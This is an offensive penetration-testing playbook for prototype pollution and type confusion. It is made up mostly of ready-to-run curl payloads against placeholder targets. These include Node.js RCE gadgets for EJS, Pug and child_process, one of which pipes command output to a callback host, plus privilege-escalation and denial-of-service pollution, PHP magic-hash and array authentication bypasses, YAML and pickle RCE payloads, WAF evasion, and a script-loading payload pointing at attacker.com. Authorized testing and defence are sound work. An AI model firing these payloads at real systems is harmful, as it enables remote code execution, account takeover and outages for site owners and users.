# Playbook: Prototype Pollution & Type Confusion

## Purpose
Detect and exploit Prototype Pollution in JavaScript (client-side and server-side),
PHP type juggling, and Python type confusion vulnerabilities. Covers detection,
exploitation chains, gadget discovery, and bypass techniques.
Input: target URL, JavaScript files, API endpoints, or application source code.

---

## Theory — JavaScript Prototype Chain

```
Every JS object inherits from Object.prototype via the [[Prototype]] chain.

  const obj = {};
  obj.__proto__ === Object.prototype  // true

Pollution occurs when an attacker injects properties into Object.prototype,
affecting ALL objects in the runtime:

  ({}).__proto__.isAdmin = true;
  const user = {};
  user.isAdmin  // true — inherited from polluted prototype

Three vectors to reach Object.prototype:
  1. __proto__        — direct prototype reference
  2. constructor.prototype — via constructor function
  3. Object.assign / deep merge — recursive property copy without key filtering

Dangerous patterns:
  function merge(target, source) {
    for (let key in source) {
      if (typeof source[key] === 'object') {
        merge(target[key], source[key]);    // recurses into __proto__
      } else {
        target[key] = source[key];
      }
    }
  }
  // Attacker input: {"__proto__": {"isAdmin": true}}
  // Result: Object.prototype.isAdmin = true
```

---

## Step 1 — Identify Merge/Extend/Clone Functions

```bash
# Download all JS files from target
katana -u "https://TARGET" -jc -d 3 -o js_urls.txt
cat js_urls.txt | grep '\.js$' | sort -u > js_files_list.txt
mkdir -p js_files
while read url; do
  filename=$(echo "$url" | md5sum | cut -d' ' -f1).js
  curl -sk "$url" -o "js_files/${filename}"
done < js_files_list.txt

# Search for vulnerable merge/extend/clone patterns
grep -rniE "(\.extend\(|\.merge\(|\.defaults\(|\.defaultsDeep\(|deepCopy|deepMerge|deepExtend|Object\.assign\(|\.cloneDeep\(|\.set\(|recursiveMerge|jsonMerge)" \
  js_files/ | tee merge_functions.txt

# Search for lodash/underscore/jquery usage
grep -rniE "(lodash|underscore|_\.merge|_\.defaults|_\.set|_\.defaultsDeep|\$\.extend)" \
  js_files/ | tee library_usage.txt

# Check library versions for known vulnerable versions
grep -rniE "lodash@[0-9]|lodash/[0-9]|lodash\.min\.js\?v=" js_files/
# Vulnerable lodash: < 4.17.12 (merge), < 4.17.16 (set/setWith)
# Vulnerable jQuery: < 3.4.0 ($.extend deep)

# Check for direct __proto__ handling (weak filter or no filter)
grep -rniE "(__proto__|constructor\.prototype|Object\.prototype)" js_files/ | tee proto_refs.txt
```

---

## Step 2 — Client-Side Prototype Pollution via URL

### URL Fragment / Query Parameter Pollution

```bash
# Many SPAs parse URL hash or query params into objects
# Vulnerable pattern: location.hash -> JSON.parse or custom parser

# Test via URL fragment
# Open in browser (fragments are not sent to server):
# https://TARGET/#__proto__[isAdmin]=true
# https://TARGET/#__proto__.isAdmin=true
# https://TARGET/?__proto__[polluted]=true
# https://TARGET/?__proto__.polluted=true
# https://TARGET/?constructor[prototype][polluted]=true

# Verify pollution in browser console:
# ({}).polluted  --> should return "true" if polluted

# Automated query param pollution check
PAYLOADS=(
  "__proto__[pptest]=pp_value"
  "__proto__.pptest=pp_value"
  "constructor[prototype][pptest]=pp_value"
  "constructor.prototype.pptest=pp_value"
  "__proto__[pptest]=pp_value&__proto__[toString]=pp_value"
)

for payload in "${PAYLOADS[@]}"; do
  echo "[TEST] https://TARGET/?${payload}"
  curl -sk "https://TARGET/?${payload}" -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}\n"
done

# Search JS for URL hash/search parsing into objects
grep -rniE "(location\.hash|location\.search|URLSearchParams|querystring\.parse|qs\.parse|deparam)" \
  js_files/ | tee url_parsers.txt
```

### jQuery $.extend Deep Merge

```bash
# jQuery < 3.4.0 is vulnerable when deep=true
# $.extend(true, {}, userInput)  -- deep merge pollutes prototype

# Check jQuery version
grep -rnoE "jQuery v[0-9]+\.[0-9]+\.[0-9]+|jquery/[0-9]+\.[0-9]+\.[0-9]+" js_files/

# Payload via JSON body to endpoint that uses $.extend:
curl -sk -X POST "https://TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "true"}}'
```

### Lodash merge/defaultsDeep/set

```bash
# lodash.merge < 4.17.12 pollutes prototype
# lodash.defaultsDeep < 4.17.12 pollutes prototype
# lodash.set/setWith < 4.17.16 pollutes via path traversal

# Check lodash version
grep -rnoE "lodash[/ ][0-9]+\.[0-9]+\.[0-9]+" js_files/

# Payload for lodash.merge:
# {"__proto__": {"polluted": "true"}}

# Payload for lodash.set path traversal:
# _.set({}, '__proto__.polluted', 'true')
# _.set({}, 'constructor.prototype.polluted', 'true')
```

---

## Step 3 — Client-Side Gadgets (Prototype Pollution to XSS)

Once pollution is confirmed, find gadgets that use inherited properties:

### Script src Override

```bash
# If app creates script elements and checks a property for src:
# const script = document.createElement('script');
# script.src = config.cdnUrl + '/app.js';  // cdnUrl from polluted prototype

# Payload:
# ?__proto__[cdnUrl]=https://attacker.com/evil

# Search for dynamic script creation
grep -rniE "(createElement\(['\"]script['\"]|\.src\s*=)" js_files/ | tee script_gadgets.txt
```

### innerHTML Gadgets

```bash
# If app uses a property to build innerHTML:
# element.innerHTML = obj.template || '<div>default</div>';

# Payload:
# ?__proto__[template]=<img src=x onerror=alert(1)>

# Search for innerHTML assignment from object properties
grep -rniE "(\.innerHTML\s*=|\.outerHTML\s*=)" js_files/ | tee html_gadgets.txt
```

### Event Handler Injection

```bash
# If app reads event handlers from config objects:
# element.setAttribute(key, config[key]);
# When config inherits onclick from polluted prototype

# Payload:
# ?__proto__[onclick]=alert(1)
# ?__proto__[onload]=alert(1)

# Search for setAttribute with dynamic keys
grep -rniE "(setAttribute\(|addEventListener\()" js_files/ | tee event_gadgets.txt
```

### DOM Clobbering Interaction

```bash
# DOM clobbering + prototype pollution = chain attack
# DOM clobbering: <img name="x" id="x"> makes window.x point to the element
# Combined: pollute a property that code reads from window/document

# Search for window property reads without hasOwnProperty
grep -rniE "(window\[|document\[|globalThis\[)" js_files/ | tee window_reads.txt
```

### Known Gadget Libraries

```bash
# Research known gadgets for common libraries:
# - Handlebars: __proto__.pendingContent = '<script>alert(1)</script>'
# - Pug/Jade:   __proto__.block = {"type":"Text","val":"<script>alert(1)</script>"}
# - Mustache:   __proto__[tag] = '<script>alert(1)</script>'
# - EJS:        __proto__.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id");x'
# - Sanitize-html: __proto__.allowedTags = ['script']
# - Google Closure: __proto__.* (multiple gadgets)

# Automated gadget finder (browser-based)
# Use: https://github.com/nicolo-ribaudo/tc39-proposal/blob/main/resources/gadgets.md
# Or:  https://ppp.pswho.com/ (Prototype Pollution to XSS gadget finder)
```

---

## Step 4 — Server-Side Prototype Pollution

### Express/Koa Body Parsing

```bash
# Express body-parser with extended: true uses qs library
# POST body: {"__proto__": {"isAdmin": true}}

# Test with JSON content type
curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "test", "__proto__": {"isAdmin": true}}'

# Test with nested __proto__ in various positions
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"data": {"__proto__": {"polluted": true}}}'

# Test with constructor.prototype
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": true}}}'

# Check if pollution persists across requests (server-side global pollution)
# Request 1: pollute
curl -sk -X POST "https://TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"testPollution": "polluted_value"}}'

# Request 2: check if a different endpoint reflects the pollution
curl -sk "https://TARGET/api/profile" | grep -i "polluted"
```

### qs Library Nested Object Parsing

```bash
# qs parses query strings into nested objects
# Vulnerable when extended parsing creates __proto__ keys

# URL-encoded body:
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '__proto__[polluted]=true'

# Nested via bracket notation:
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'a[__proto__][polluted]=true'

# Dot notation variant:
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '__proto__.polluted=true'
```

### MongoDB Query Injection via Prototype Pollution

```bash
# If prototype is polluted with MongoDB operators,
# queries may behave unexpectedly

# Pollute to bypass authentication:
curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"__proto__": {"$gt": ""}}}'

# Pollute $where clause:
curl -sk -X POST "https://TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# Pollute to add operator to all queries:
# If Object.prototype.$ne = "" is set, all equality checks become $ne
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$ne": null}}'
```

### RCE Through child_process Options Pollution

```bash
# Node.js child_process.exec/execSync/spawn/fork read options from
# the options object. If prototype is polluted, attacker controls:
#   shell, env, cwd, uid, gid, argv0

# Payload — pollute shell option:
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"child_process\").execSync(\"id\").toString())//"}}'

# Payload — pollute env to inject NODE_OPTIONS:
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/cmdline", "NODE_DEBUG": "1"}}}'

# Payload — pollute shell for spawn (no shell by default):
# spawn() without explicit shell: false inherits shell from prototype
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": true}}'
# Combined with command injection in arguments

# Payload — fork() NODE_OPTIONS:
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"execPath": "/bin/bash", "execArgv": ["-c", "id > /tmp/pwned"]}}'
```

### Environment Variable Injection

```bash
# Pollute env property read by child_process:
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"env": {"EVIL": "1", "LD_PRELOAD": "/tmp/evil.so"}}}'

# NODE_OPTIONS injection (trigger --require with attacker file):
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"NODE_OPTIONS": "--inspect=attacker.com:1337"}}'
```

---

## Step 5 — Detection Tools

```bash
# PPScan — detect prototype pollution in JS files
# https://github.com/AzizKpln/ppScan
git clone https://github.com/AzizKpln/ppScan.git
cd ppScan && pip install -r requirements.txt
python3 ppscan.py -u "https://TARGET"

# ppfuzz — prototype pollution fuzzer
# https://github.com/nicolo-ribaudo/ppfuzz (Rust-based, fast)
cargo install ppfuzz
ppfuzz -l js_files_list.txt

# Client-Side Prototype Pollution scanner (browser extension)
# https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io
# Use "DOM Invader" in Burp Suite built-in browser:
#   1. Enable DOM Invader from the Burp browser extension bar
#   2. Enable "Prototype pollution" toggle
#   3. Browse the target — it auto-detects pollution + gadgets

# Nuclei templates for prototype pollution
nuclei -u "https://TARGET" -t http/vulnerabilities/prototype-pollution/ -v

# Burp extensions:
#   - Server-Side Prototype Pollution Scanner (PortSwigger)
#   - JS Link Finder (find JS files for manual review)
#   - Param Miner (discovers hidden parameters including __proto__)

# Server-side detection via response timing/behavior:
# Pollute and observe side effects
# Status pollution — causes 500 if toString is broken:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"status": 510}}'
# If response comes back with status 510, pollution is confirmed

# Content-type pollution:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"content-type": "text/html"}}'

# JSON spaces pollution (Express):
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": "  "}}'
# If subsequent JSON responses are indented with 2 spaces, pollution works
```

---

## Step 6 — Exploitation Chains

### Prototype Pollution to XSS (DOM Gadgets)

```bash
# Chain: URL param pollution -> gadget -> XSS

# Example with Handlebars gadget:
# 1. Pollute: ?__proto__[pendingContent]=<img/src=x onerror=alert(1)>
# 2. When Handlebars renders any template, injected content appears

# Example with EJS gadget (if rendered client-side):
# 1. Pollute: ?__proto__[client]=true&__proto__[escapeFunction]=1;alert(1)//

# Example with generic innerHTML gadget:
# 1. Find: element.innerHTML = config.welcomeMessage || 'Hello';
# 2. Pollute: ?__proto__[welcomeMessage]=<img src=x onerror=alert(document.cookie)>

# Generic approach:
# 1. Confirm pollution via URL: ?__proto__[pptest]=ppvalue
#    Verify in console: ({}).pptest === "ppvalue"
# 2. Use DOM Invader to auto-find gadgets
# 3. Chain the gadget property with an XSS payload
```

### Prototype Pollution to RCE (Node.js)

```bash
# Chain: JSON body pollution -> child_process options -> command execution

# Via EJS render (server-side):
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl https://CALLBACK/rce\");x"
    }
  }'
# Triggers when EJS renders any template

# Via child_process.spawn shell pollution:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "/bin/bash",
      "env": {
        "BASH_FUNC_echo%%": "() { id | curl https://CALLBACK -d @-; }"
      }
    }
  }'

# Via Pug template engine:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "block": {
        "type": "Text",
        "val": "x])+process.mainModule.require(\"child_process\").execSync(\"id\")+([x"
      }
    }
  }'
```

### Prototype Pollution to Privilege Escalation

```bash
# Many apps check user properties like:
#   if (user.isAdmin) { ... }
#   if (user.role === 'admin') { ... }
# If user object does not have isAdmin as own property,
# it falls through to the prototype

# Pollute isAdmin:
curl -sk -X POST "https://TARGET/api/profile" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_SESSION" \
  -d '{"__proto__": {"isAdmin": true}}'

# Pollute role:
curl -sk -X POST "https://TARGET/api/profile" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_SESSION" \
  -d '{"__proto__": {"role": "admin"}}'

# Then access admin functionality:
curl -sk "https://TARGET/admin/dashboard" \
  -H "Cookie: session=USER_SESSION"

# Pollute permissions array (if checked via includes):
curl -sk -X POST "https://TARGET/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true, "verified": true, "premium": true}}'
```

### Prototype Pollution to DoS

```bash
# Crash toString/valueOf — breaks string coercion globally
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"toString": 1}}'
# Any Object.toString() call now throws TypeError

curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"valueOf": 1}}'

# Crash JSON serialization:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"toJSON": 1}}'

# Infinite loop via circular prototype reference (theoretical):
# Not directly exploitable via JSON but possible in custom merge logic

# Break Array operations:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"length": 999999999}}'
```

---

## Step 7 — PHP Type Juggling

### Loose Comparison (==) Bypass

```bash
# PHP loose comparison treats different types as equal:
#   "0" == false       // true
#   "" == 0            // true
#   "0e12345" == "0"   // true (scientific notation)
#   [] == false        // true
#   NULL == false      // true

# Password bypass with magic hash:
# If code does: if ($hash == $input_hash)
# MD5 hashes starting with 0e followed by only digits are treated as 0
# "Magic" strings whose MD5 starts with 0e[0-9]+:
#   "240610708"  -> md5: 0e462097431906509019562988736854
#   "QNKCDZO"   -> md5: 0e830400451993494058024219903391
#   "aabg7XSs"  -> md5: 0e087386482136013740957780965295
#   "aabC9RqS"  -> md5: 0e041022518165728065344349536299

# SHA1 magic hashes:
#   "aaroZmOk"   -> sha1: 0e66507019969427134894567494305185566735
#   "aaK1STfY"   -> sha1: 0e76658526655756207688271159624026011393

# Authentication bypass:
curl -sk -X POST "https://TARGET/login.php" \
  -d 'username=admin&password=240610708'

# Type juggling with arrays:
curl -sk -X POST "https://TARGET/login.php" \
  -d 'username=admin&password[]=anything'
# If code does strcmp($password, $stored_hash):
#   strcmp(array, string) returns NULL
#   NULL == 0 is true in loose comparison

# JSON type confusion (send integer instead of string):
curl -sk -X POST "https://TARGET/api/verify" \
  -H "Content-Type: application/json" \
  -d '{"token": 0}'
# If code does: if ($token == $expected_token)
# 0 == "any_string_not_starting_with_number" is true

curl -sk -X POST "https://TARGET/api/verify" \
  -H "Content-Type: application/json" \
  -d '{"token": true}'
# true == "any_non_empty_string" is true
```

### strcmp Bypass

```bash
# strcmp(array, string) returns NULL in PHP < 8.0
# NULL == 0 evaluates to true

# Array injection via POST:
curl -sk -X POST "https://TARGET/login.php" \
  -d 'password[]=anything'

# Array injection via JSON:
curl -sk -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": []}'

# In PHP 8.0+, strcmp throws TypeError on array input
# But older versions are common in the wild
```

### Array Injection

```bash
# PHP type juggling with in_array (loose by default):
# in_array(0, ["admin", "user"]) === true  (0 == "admin" is true)
# in_array("0", [0, 1, 2]) === true

# Bypass role check:
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"role": 0}'

# Bypass is_numeric check with hex strings (PHP < 7):
# is_numeric("0xdeadbeef") returns true
# "0xdeadbeef" == 3735928559 is true

# Switch statement bypass:
# switch ($input) { case 0: ... }
# Any non-numeric string == 0 in loose comparison
curl -sk -X POST "https://TARGET/api/action" \
  -H "Content-Type: application/json" \
  -d '{"action": 0}'

# preg_match bypass with array:
# preg_match("/pattern/", array()) returns false, no match
# But does not throw error — bypasses regex validation
curl -sk -X POST "https://TARGET/api/data" \
  -d 'input[]=bypass_regex_validation'
```

---

## Step 8 — Python Type Confusion

### YAML Deserialization

```bash
# PyYAML yaml.load() (without SafeLoader) executes arbitrary Python
# If target accepts YAML input:

# RCE payload:
cat > payload.yaml << 'YAMLEOF'
!!python/object/apply:os.system
- "curl https://CALLBACK/yaml-rce"
YAMLEOF

# Alternative payload (subprocess):
cat > payload2.yaml << 'YAMLEOF'
!!python/object/apply:subprocess.check_output
- ["id"]
YAMLEOF

# Alternative payload (eval):
cat > payload3.yaml << 'YAMLEOF'
!!python/object/new:type
args:
  - exploit
  - !!python/tuple []
  - {"__reduce__": !!python/name:os.system, "__reduce_args__": !!python/tuple ["curl https://CALLBACK/rce"]}
YAMLEOF

# Send to endpoint that parses YAML:
curl -sk -X POST "https://TARGET/api/import" \
  -H "Content-Type: application/x-yaml" \
  -d @payload.yaml

curl -sk -X POST "https://TARGET/api/config" \
  -H "Content-Type: text/yaml" \
  -d @payload.yaml

# Detection — look for YAML parsing in application:
# Endpoints that accept: .yml/.yaml file upload, Content-Type: application/x-yaml
# Config import features, CI/CD pipeline configuration
```

### JSON Schema Bypass

```bash
# Python JSON schema validation can be confused with type mismatches

# If schema expects string but code does not enforce after validation:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"field": {"$gt": ""}}'
# If field is passed to MongoDB without further validation

# Integer overflow / type confusion:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"amount": 1e308}'
# float("inf") can bypass numeric checks

curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"quantity": -1}'
# Negative values often bypass "greater than 0" checks in weak validation

# Boolean confusion:
curl -sk -X POST "https://TARGET/api/verify" \
  -H "Content-Type: application/json" \
  -d '{"verified": "true"}'
# String "true" vs boolean true — behavior differs

# NaN confusion:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"value": NaN}'
# NaN != NaN, so equality checks always fail

# Pickle deserialization (if endpoint accepts pickle):
python3 -c "
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl https://CALLBACK/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
" > pickle_payload.txt

# Send pickled payload:
curl -sk -X POST "https://TARGET/api/import" \
  -H "Content-Type: application/octet-stream" \
  -d "$(cat pickle_payload.txt)"
```

---

## Step 9 — Bypass Techniques for Prototype Pollution

### Alternative Property Names

```bash
# If __proto__ is filtered, try alternatives:

# constructor.prototype path:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": true}}}'

# Nested constructor:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"x": {"constructor": {"prototype": {"polluted": true}}}}'

# Unicode escape for __proto__:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}'

# Overlong UTF-8 (may bypass WAF):
# __proto__ with various encodings in query params
curl -sk "https://TARGET/api/data?__%70roto__[polluted]=true"
curl -sk "https://TARGET/api/data?__pro\to__[polluted]=true"

# Case variations (some parsers are case-insensitive):
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__Proto__": {"polluted": true}}'

# Via array index in path:
# lodash.set(obj, ['__proto__', 'polluted'], true)
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"path": ["__proto__", "polluted"], "value": true}'
```

### Symbol Properties

```bash
# Symbols cannot be created via JSON, but if the app has custom parsing:
# Symbol properties are not enumerable and bypass most filters
# This is a theoretical vector — mainly for source code review

# In code review, check if app uses:
#   Object.getOwnPropertySymbols()
#   Reflect.ownKeys()
# These access symbol properties that JSON-based filters miss
```

### Proxy Objects

```bash
# Proxy objects can intercept property access and bypass prototype checks
# Relevant in source code review — not directly injectable via JSON

# In code review, look for:
#   new Proxy(target, handler) without proper trap sanitization
#   handler.get / handler.set that propagate to prototype

# If target uses Proxy for object wrapping, pollution may bypass
# hasOwnProperty checks because Proxy.get intercepts before own-property check
```

### WAF Bypass for JSON Payloads

```bash
# Content-Type variations:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json; charset=utf-8" \
  -d '{"__proto__": {"polluted": true}}'

curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/csp-report" \
  -d '{"__proto__": {"polluted": true}}'

# Duplicate key confusion (last key wins in most parsers):
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": "safe", "__proto__": {"polluted": true}}'

# Whitespace/comment injection (non-standard parsers):
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__"/**/: {"polluted": true}}'

# Chunked transfer encoding to evade WAF inspection:
curl -sk -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -H "Transfer-Encoding: chunked" \
  -d '{"__proto__": {"polluted": true}}'
```

---

## Output

```
PLAYBOOK : Prototype Pollution & Type Confusion
TARGET   : https://target.com/api/settings
-------------------------------------------------------------
STEP 1   : Identify merge/extend functions
STATUS   : DONE
RESULT   : lodash 4.17.4 detected (vulnerable to merge pollution)
-------------------------------------------------------------
STEP 2   : Client-side pollution test
STATUS   : DONE
RESULT   : URL param ?__proto__[test]=1 confirms pollution in browser
-------------------------------------------------------------
STEP 3   : Gadget discovery
STATUS   : DONE
RESULT   : innerHTML gadget found — config.welcomeMsg rendered unsanitized
-------------------------------------------------------------
STEP 4   : Server-side pollution test
STATUS   : DONE
RESULT   : JSON body {"__proto__":{"json spaces":"  "}} confirmed
           Subsequent responses returned indented JSON
-------------------------------------------------------------
STEP 5   : Exploitation chain
STATUS   : DONE
RESULT   : Prototype pollution to XSS via innerHTML gadget
           Payload: ?__proto__[welcomeMsg]=<img/src=x onerror=alert(document.domain)>
-------------------------------------------------------------
FINDINGS SUMMARY
  [CRITICAL] Server-side prototype pollution via /api/settings (RCE possible)
  [HIGH]     Client-side prototype pollution to XSS via innerHTML gadget
  [MEDIUM]   lodash 4.17.4 — known vulnerable version
  [INFO]     Multiple merge functions identified in JS bundle
-------------------------------------------------------------
NEXT STEPS
  1. Test RCE chain via child_process options pollution
  2. Enumerate all endpoints accepting JSON body for server-side PP
  3. Load 03_reporting/report_writer.md — write report for confirmed findings
  4. Load 03_reporting/severity_scorer.md — score server-side PP finding
```

---

## Tools Reference

```bash
# Prototype pollution specific
git clone https://github.com/AzizKpln/ppScan.git          # JS file scanner
cargo install ppfuzz                                        # Rust-based fuzzer
pip install pyjwt                                           # JWT testing (related chains)

# Browser-based
# DOM Invader (built into Burp Suite browser) — best for client-side PP + gadgets
# https://ppp.pswho.com/ — online PP to XSS gadget database

# Burp extensions
# Server-Side Prototype Pollution Scanner — automated server-side detection
# Param Miner — discovers __proto__ as hidden parameter
# Backslash Powered Scanner — detects server-side behavior changes

# Nuclei
nuclei -u "https://TARGET" -tags prototype-pollution

# Manual verification in Node.js REPL
node -e "
  const obj = JSON.parse('{\"__proto__\": {\"polluted\": true}}');
  const target = {};
  // Simulate vulnerable merge
  function merge(a, b) {
    for (let k in b) {
      if (typeof b[k] === 'object' && b[k] !== null) {
        if (!a[k]) a[k] = {};
        merge(a[k], b[k]);
      } else {
        a[k] = b[k];
      }
    }
  }
  merge(target, obj);
  console.log('Polluted:', ({}).polluted);
"
```

---

## Quick Reference — Payload Cheat Sheet

```
CLIENT-SIDE POLLUTION:
  URL param:    ?__proto__[key]=value
  URL fragment: #__proto__[key]=value
  Constructor:  ?constructor[prototype][key]=value

SERVER-SIDE POLLUTION (JSON body):
  Basic:        {"__proto__": {"key": "value"}}
  Constructor:  {"constructor": {"prototype": {"key": "value"}}}
  Nested:       {"x": {"__proto__": {"key": "value"}}}
  Unicode:      {"\u005f\u005fproto\u005f\u005f": {"key": "value"}}

SERVER-SIDE DETECTION (Express):
  JSON spaces:  {"__proto__": {"json spaces": "  "}}
  Status:       {"__proto__": {"status": 510}}

RCE GADGETS (Node.js):
  EJS:          {"__proto__": {"outputFunctionName": "x;PAYLOAD;x"}}
  Pug:          {"__proto__": {"block": {"type":"Text","val":"PAYLOAD"}}}
  child_process:{"__proto__": {"shell": true}}

PHP TYPE JUGGLING:
  Magic MD5:    240610708, QNKCDZO, aabg7XSs
  Array bypass: password[]=anything
  Bool bypass:  {"token": true}
  Zero bypass:  {"token": 0}

PYTHON DESERIALIZATION:
  YAML RCE:     !!python/object/apply:os.system ["cmd"]
  Pickle RCE:   __reduce__ -> (os.system, ("cmd",))
```
